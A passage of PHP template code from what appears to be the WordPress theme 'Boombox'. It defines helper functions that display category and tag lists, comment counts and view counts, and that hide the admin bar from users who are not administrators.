						<i class="icon icon-spinner spinner-pulse"></i>
						<span class="text" label="<?php esc_html_e( 'points', 'boombox' ); ?>"><?php echo boombox_get_post_point_count( $post->ID ); ?></span>
					</span>
				</div>
			</div>
	<?php
		}
	}
}

if ( ! function_exists( 'boombox_categories_list' ) ) {
	/**
	 * Get post categories list
	 */
	function boombox_categories_list() {
		$categories_list = get_the_category_list( __( ' ', 'boombox' ) );
		if ( ! empty( $categories_list ) ):
			printf( '<div class="cat-links">%1$s</div>', $categories_list );
		endif;
	}
}

if ( ! function_exists( 'boombox_tags_list' ) ) {
	/**
	 * Get post categories list
	 */
	function boombox_tags_list() {
		$tags_list = get_the_tag_list( __( ' ', 'boombox' ) );
		if ( ! empty( $tags_list ) ):
			printf( '<div class="post-tags">%1$s</div>', $tags_list );
		endif;
	}
}

if ( ! function_exists( 'boombox_post_comments' ) ) {
	/**
	 * Get post comments
	 */
	function boombox_post_comments(  ) {
		if ( ! post_password_required() && ( comments_open() || get_comments_number() ) ) {
			$comments_count = (int) get_comments_number( get_the_ID() );

			if( $comments_count ) {
				printf( '<div class="post-comments"><a href="%1$s"><i class="icon-boombox-comment"></i><span>%2$d</span></a></div>',
					get_comments_link(),
					$comments_count );
			}
		}
	}
}

if ( ! function_exists( 'boombox_show_post_views' ) ) {
	/**
	 * Get post views
	 */
	function boombox_show_post_views() {
		if ( is_singular() ) {
			global $post;
			$views_count = boombox_get_views_count( $post->ID );
			printf( '<div class="views"><i class="icon icon-eye"></i><span class="count">%1$s</span>%2$s</div>',
				boombox_numerical_word ( $views_count ),
				_n( 'view', 'views', $views_count, 'boombox' ) );
		}
	}
}

if( ! function_exists( 'boombox_remove_admin_bar' ) ) {

	/**
	* Remove Admin Bar
	*/
	function boombox_remove_admin_bar() {

		if( ! is_super_admin() && !current_user_can( 'administrator' ) ) {
			add_filter( 'show_admin_bar', '__return_false' );
		}
	}

}
